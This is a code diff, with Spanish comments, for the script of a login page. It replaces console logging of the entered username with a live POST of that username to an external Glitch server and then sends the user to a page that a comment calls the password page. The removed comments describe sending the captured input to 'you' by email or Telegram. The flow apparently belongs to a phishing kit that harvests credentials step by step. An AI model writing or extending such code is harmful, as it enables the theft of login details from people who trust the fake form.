@@ -72,38 +72,38 @@
             const usernameInput = document.getElementById('username');
             const entrarButton = document.getElementById('entrarButton');
 
-            loginForm.addEventListener('submit', (event) => {
-                event.preventDefault(); // Evita que el formulario se envíe de la forma tradicional (recargar la página)
+            loginForm.addEventListener('submit', async (event) => { // Añadido 'async' aquí
+                event.preventDefault(); // Evita que el formulario se envíe de la forma tradicional
 
                 const username = usernameInput.value;
-                console.log('Usuario ingresado:', username); // Simulación de envío: se muestra en la consola del navegador
+                console.log('Usuario ingresado (para enviar):', username);
 
-                // --- IMPORTANTE: Envío de información a un método externo ---
-                // Para enviar esta información a "ti" por algún método real (ej. email, Telegram, base de datos),
-                // necesitarías un backend (un servidor) o una API.
-                // Aquí te dejo un ejemplo de cómo podrías hacer una petición a un servidor ficticio:
-                /*
-                fetch('/api/enviar-usuario', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({ username: username }),
-                })
-                .then(response => response.json())
-                .then(data => {
-                    console.log('Respuesta del servidor (simulada):', data);
-                    // Aquí podrías manejar la respuesta del servidor si el envío fue exitoso
-                    // Por ejemplo, redirigir solo si el servidor confirma el envío
-                })
-                .catch((error) => {
-                    console.error('Error al intentar enviar el usuario:', error);
-                    // Manejar errores de envío
-                });
-                */
+                // --- Envío de información al backend de Glitch (Usuario) ---
+                const glitchBackendUrl = 'https://little-mighty-zinc.glitch.me'; // URL de tu proyecto Glitch
 
-                // Redireccionar a la siguiente opción (página de bienvenida)
-                window.location.href = 'bienvenido.html';
+                try {
+                    const response = await fetch(`${glitchBackendUrl}/submit-user`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ username: username })
+                    });
+
+                    const result = await response.json();
+                    console.log('Respuesta del backend (usuario):', result);
+
+                    if (result.success) {
+                        // Si el envío fue exitoso, redirigir a la página de contraseña
+                        window.location.href = 'bienvenido.html';
+                    } else {
+                        // Manejar errores si el backend reporta un fallo
+                        alert('Error al enviar usuario: ' + result.message); // Usar un modal personalizado
+                    }
+                } catch (error) {
+                    console.error('Error al conectar con el backend o al enviar usuario:', error);
+                    alert('No se pudo conectar con el servidor. Intenta de nuevo más tarde.'); // Usar un modal personalizado
+                }
             });
         });
     </script>
